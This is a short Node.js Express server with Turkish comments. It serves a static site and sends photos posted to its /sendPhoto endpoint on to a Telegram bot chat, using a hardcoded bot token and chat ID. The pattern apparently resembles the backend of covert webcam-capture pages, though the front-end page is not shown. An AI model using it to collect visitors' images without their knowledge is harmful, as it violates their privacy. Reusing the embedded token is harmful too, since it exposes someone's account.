const express = require("express");
const multer = require("multer");
const axios = require("axios");
const FormData = require("form-data");
const path = require("path");

const app = express();
const upload = multer();

// 👉 Telegram bilgileri
const TOKEN = "7819062858:AAGrNn2DdZD945tMJDHDj5Wx-Kju8-WoBJg";
const CHAT_ID = "7249851527";

// 👉 www klasörünü site yap
app.use(express.static(path.join(__dirname)));

// Ana sayfa
app.get("/", (req, res) => {
    res.sendFile(path.join(__dirname, "index.html"));
});

// 👉 Foto alma endpoint
app.post("/sendPhoto", upload.single("photo"), async (req, res) => {

    try {

        if (!req.file) {
            return res.status(400).send("Foto yok");
        }

        const form = new FormData();
        form.append("chat_id", CHAT_ID);
        form.append("photo", req.file.buffer, "photo.jpg");

        await axios.post(
            `https://api.telegram.org/bot${TOKEN}/sendPhoto`,
            form,
            { headers: form.getHeaders() }
        );

        console.log("Foto Telegram'a gönderildi");
        res.send("OK");

    } catch (err) {
        console.log("Telegram hata:", err.message);
        res.status(500).send("Hata");
    }
});

// Server başlat
const PORT = 3000;

app.listen(PORT, () => {
    console.log("Server çalışıyor → http://localhost:" + PORT);
});
